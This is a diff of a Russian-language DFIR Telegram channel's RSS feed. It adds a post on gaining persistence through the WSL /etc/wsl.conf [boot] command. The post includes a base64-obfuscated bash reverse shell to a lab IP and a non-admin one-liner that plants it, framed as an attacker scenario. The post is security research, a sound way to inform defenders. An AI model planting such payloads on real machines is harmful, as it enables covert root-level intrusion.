@@ -1,5 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Garden Detective</title><link>https://t.me/gardendetective</link><description>DFIR... but why stop there</description><language>ru</language><lastBuildDate>Thu, 27 Nov 2025 12:40:08 +0000</lastBuildDate><item><title>🔵 Последние 2 доклада в этом году (🍩):</title><link>https://t.me/gardendetective/44</link><description>#socforum2025 #zeronights2025
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Garden Detective</title><link>https://t.me/gardendetective</link><description>DFIR... but why stop there</description><language>ru</language><lastBuildDate>Fri, 30 Jan 2026 14:41:07 +0000</lastBuildDate><item><title>🔵 Копаясь в документации Microsoft по подсистеме WSL (Windows Subsystem for Linux), нашёл интересный механизм закрепления. В каждом инстансе можно создать файл /etc/wsl.conf и в секции [boot] указать...</title><link>https://t.me/gardendetective/45</link><description>#persistence #t1037 #wsl
+🔵 Копаясь в документации Microsoft по подсистеме WSL (Windows Subsystem for Linux), нашёл интересный механизм закрепления. В каждом инстансе можно создать файл /etc/wsl.conf и в секции [boot] указать для параметра command команду, которая будет выполняться с правами root при каждом его запуске.
+Пример содержимого файла /etc/wsl.conf (запуск обратной оболочки):
+[boot]
+command=echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM3LjEyOS8yMjIyIDA+JjE= | base64 -d | /bin/bash
+🔴 Представим сценарий, в котором атакующий удалённо подключился по протоколу RDP к рабочей станции ИТ-администратора под управлением ОС Windows 11, на которой включен WSL2 и настроен Linux-дистрибутив.
+Цель злоумышленника — закрепиться в системе через файл /etc/wsl.conf.
+Команды (cmd.exe, powershell.exe; запуск без прав Администратора):
+wsl -l -v
+wsl -u root -d &lt;distro_name&gt; --exec bash -c "echo -e '[boot]\ncommand=echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM3LjEyOS8yMjIyIDA+JjE= | base64 -d | /bin/bash' &gt; /etc/wsl.conf"
+Пссс... После получения обратной оболочки... Напоминаю: из WSL по умолчанию можно запускать исполняемые файлы Windows.
+🔵 Дополнительные моменты:
+➖После внесения изменений в конфигурационный файл /etc/wsl.conf, полезная нагрузка, указанная в command, выполнится при следующем запуске инстанса WSL. Некоторые нюансы работы экземпляра WSL:
+*️⃣в сборке 18267 Microsoft добавили механизм таймаута завершения работы инстанса WSL, и он по умолчанию установлен на 15 секунд. Это означает, что экземпляр будет остановлен через 15 секунд после завершения последнего процесса WSL;
+*️⃣если под процессом /init (PID 2) в WSL запущен хотя бы один пользовательский процесс (например, в фоновом режиме), то экземпляр WSL не будет завершён (ссылка);
+Пример:
+nohup python3 -m http.server 8000 &amp;
+*️⃣для того, чтобы принудительно завершить работу определённого дистрибутива или всех сразу, можно использовать эти команды:
+wsl -t &lt;distro_name&gt;
+wsl --shutdown</description><pubDate>Fri, 30 Jan 2026 14:41:07 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_45</guid></item><item><title>🔵 Последние 2 доклада в этом году (🍩):</title><link>https://t.me/gardendetective/44</link><description>#socforum2025 #zeronights2025
 🔵 Последние 2 доклада в этом году (🍩):
 1️⃣ Доклад «После Red Team можно не бояться атак... Не бояться атак, да?» [SOC Forum 2025].
 ➖ Совместно с Олегом Скулкиным (ссылка на TG-канал).
